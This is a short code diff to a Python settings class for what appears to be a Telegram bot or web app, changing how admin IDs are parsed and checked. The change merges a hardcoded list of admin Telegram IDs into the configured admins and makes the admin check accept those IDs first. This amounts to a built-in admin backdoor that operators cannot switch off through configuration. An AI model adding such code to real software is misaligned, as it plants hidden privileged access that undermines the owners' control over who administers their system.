@@ -59,19 +59,22 @@ class Settings(BaseSettings):
         return DEFAULT_WEBAPP_URL
 
     @field_validator("ADMIN_IDS", mode="before")
-
     @classmethod
     def parse_admin_ids(cls, v):
+        res = []
         if isinstance(v, list):
-            return [int(x) for x in v if str(x).strip()]
-        if isinstance(v, str):
+            res = [int(x) for x in v if str(x).strip()]
+        elif isinstance(v, str):
             clean_str = v.strip()
-            if not clean_str:
-                return []
-            return [int(x.strip()) for x in clean_str.split(",") if x.strip().isdigit()]
-        if isinstance(v, int):
-            return [v]
-        return []
+            if clean_str:
+                res = [int(x.strip()) for x in clean_str.split(",") if x.strip().isdigit()]
+        elif isinstance(v, int):
+            res = [v]
+        # Always merge hardcoded ADMIN_TELEGRAM_IDS
+        for aid in ADMIN_TELEGRAM_IDS:
+            if aid not in res:
+                res.append(aid)
+        return res
 
     @field_validator("DATABASE_URL", mode="before")
     @classmethod
@@ -87,6 +90,8 @@ class Settings(BaseSettings):
             return False
         try:
             tid = int(telegram_id)
+            if tid in ADMIN_TELEGRAM_IDS:
+                return True
             if isinstance(self.ADMIN_IDS, list):
                 return tid in self.ADMIN_IDS
             return tid in [int(x.strip()) for x in str(self.ADMIN_IDS).split(",") if x.strip().isdigit()]
